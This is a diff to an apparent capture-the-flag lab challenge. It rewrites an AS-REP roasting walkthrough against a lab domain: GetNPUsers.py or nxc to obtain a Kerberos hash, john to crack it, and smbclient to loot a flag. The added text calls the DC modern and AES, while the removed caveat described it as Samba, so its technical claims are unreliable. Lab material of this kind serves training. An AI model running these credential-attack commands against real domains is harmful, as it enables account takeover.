@@ -76,18 +76,14 @@ message: |
 
   Point your attack box's resolver and `/etc/krb5.conf` at the DC, then:
 
-  1. **AS-REP roast the username list (impacket, the real-world technique):**
-     `GetNPUsers.py LAKESIDE.LAB/ -usersfile users.txt -no-pass -dc-ip {{ machines.dc.addresses.lab }} -format hashcat`
-     → against a Windows AD DC this returns a `$krb5asrep$23$svc-scanner@...` hash.
-  2. **Crack it:** `hashcat -m 18200 asrep.hash rockyou.txt` (the password is a weak word built from the scanner service's name and a year).
+  1. **AS-REP roast the username list (no credentials):**
+     `GetNPUsers.py LAKESIDE.LAB/ -usersfile users.txt -no-pass -dc-ip {{ machines.dc.addresses.lab }} -format john`
+     (or `nxc ldap {{ machines.dc.addresses.lab }} -u users.txt -p '' --asreproast out.txt`)
+     → only `svc-scanner`, the pre-auth-disabled account, returns a `$krb5asrep$...` hash; the
+     ordinary staff accounts are refused. This is a modern DC, so the hash is AES (`$krb5asrep$18$`).
+  2. **Crack it:** `john --format=krb5asrep --wordlist=rockyou.txt asrep.hash` (the password is a
+     weak word built from the scanner service's name and a year). John's `krb5asrep` format cracks
+     the AES AS-REP; `hashcat -m 18200` only handles the older RC4 form.
   3. **Loot the flag:** `smbclient //dc/imaging -U 'LAKESIDE\svc-scanner%<cracked>' -c 'get flag.txt'`.
-
-  > **Samba caveat.** This DC is **Samba**, whose KDC demands pre-authentication for *every*
-  > account — even one flagged `DONT_REQ_PREAUTH` — so `GetNPUsers -no-pass` here returns
-  > `KDC_ERR_PREAUTH_REQUIRED` and no hash (confirmed on Samba 4.17/4.19). The crackable AS-REP
-  > `enc-part` is emitted by the KDC in any *pre-authenticated* AS exchange, so the roastable
-  > `$krb5asrep$23$` hash is obtained with a native RC4-pinned AS-REQ (see `asrep.py` in the
-  > image) and cracked with `hashcat -m 18200` exactly as above. The attack, the hash, and the
-  > crack are identical; only how the hash leaves the KDC differs.
 
   Submit the contents of `flag.txt`.
